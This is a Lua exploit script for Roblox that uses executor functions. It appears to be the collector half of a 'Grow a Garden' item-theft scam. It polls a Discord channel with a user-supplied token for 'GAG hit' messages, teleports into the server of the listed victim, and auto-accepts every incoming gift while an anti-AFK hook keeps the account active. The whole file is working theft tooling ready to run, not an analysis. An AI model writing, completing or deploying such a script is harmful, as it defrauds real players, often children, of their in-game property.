if not game:IsLoaded() then
	game.Loaded:Wait() -- Wait for game to load
end

if token == "" or channelId == "" then
    game.Players.LocalPlayer:kick("Add your token or channelId to use")
end

local bb = game:GetService("VirtualUser") -- Anti AFK
game:service "Players".LocalPlayer.Idled:connect(function()
    bb:CaptureController()
    bb:ClickButton2(Vector2.new())
end)

local HttpServ = game:GetService("HttpService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local victimFile = isfile("user_gag.txt")
local joinedFile = isfile("joined_ids.txt")
if not victimFile then
    writefile("user_gag.txt", "victim username")
end
if not joinedFile then
    writefile("joined_ids.txt", "[]") -- Initialize with empty JSON array
end
local victimUser = readfile("user_gag.txt")
local joinedIds = HttpServ:JSONDecode(readfile("joined_ids.txt"))
local didVictimLeave = false
local timer = 0

local function saveJoinedId(messageId)
    table.insert(joinedIds, messageId) -- Add the new ID
    writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds)) -- Save back to the file
end

local function waitForPlayerLeave()
    local playerRemovedConnection
    playerRemovedConnection = game.Players.PlayerRemoving:Connect(function(removedPlayer)
        if removedPlayer.Name == victimUser then
            if playerRemovedConnection then
                playerRemovedConnection:Disconnect()
            end
            didVictimLeave = true
        end
    end)
end

waitForPlayerLeave() -- Start listening for the victim leaving

local Players = game:GetService("Players")
local plr = Players.LocalPlayer

-- Wait for game to fully load
while plr:GetAttribute("DataFullyLoaded") ~= true do
    plr:GetAttributeChangedSignal("DataFullyLoaded"):Wait()
end
while plr:GetAttribute("Finished_Loading") ~= true do
    plr:GetAttributeChangedSignal("Finished_Loading"):Wait()
end
while plr:GetAttribute("Loading_Screen_Finished") ~= true do
    plr:GetAttributeChangedSignal("Loading_Screen_Finished"):Wait()
end

wait(1)
local giftNoti = plr:WaitForChild("PlayerGui"):WaitForChild("Gift_Notification"):WaitForChild("Frame")

local function acceptGifts()
    while task.wait(0.1) do
        for _, v in pairs(giftNoti:GetChildren()) do
            if v:IsA("ImageLabel") then
                local acceptImageButton = v:WaitForChild("Holder"):WaitForChild("Frame"):WaitForChild("Accept")
                replicatesignal(acceptImageButton.MouseButton1Click)
            end
        end
    end
end

task.spawn(acceptGifts) -- Start accepting gifts

game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('hi')

local function increaseTimer()
    while task.wait(1) do
        timer = timer + 1
    end
end

task.spawn(increaseTimer)

local function autoJoin()
    local response = request({
        Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=10",
        Method = "GET",
        Headers = {
            ['Authorization'] = token,
            ['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            ["Content-Type"] = "application/json"
        }
    })

    if response.StatusCode == 200 then
        local messages = HttpServ:JSONDecode(response.Body)
        if #messages == 0 then
            print("0 messages found")
            return
        end
        for _, message in ipairs(messages) do
            if message.content ~= "" and message.embeds and message.embeds[1] and message.embeds[1].title then
                if message.embeds[1].title:find("Join to get GAG hit") then
                    local placeId, jobId = string.match(message.content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)') -- Extract placeId and jobId from the embed
                    if placeId and jobId then
                        local victimUsername = message.embeds[1].fields[1].value

                        if didVictimLeave or timer > 10 then
                            if not table.find(joinedIds, tostring(message.id)) then
                                saveJoinedId(tostring(message.id)) -- Save this ID to the list
                                writefile("user_gag.txt", victimUsername)
                                game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId) -- Join the server
                                return
                            end
                        end
                    end
                end
            end
        end
    else
        print("Response code is not 200. Is your token and channelid correct?")
    end
end

while wait(5) do
    autoJoin()
end
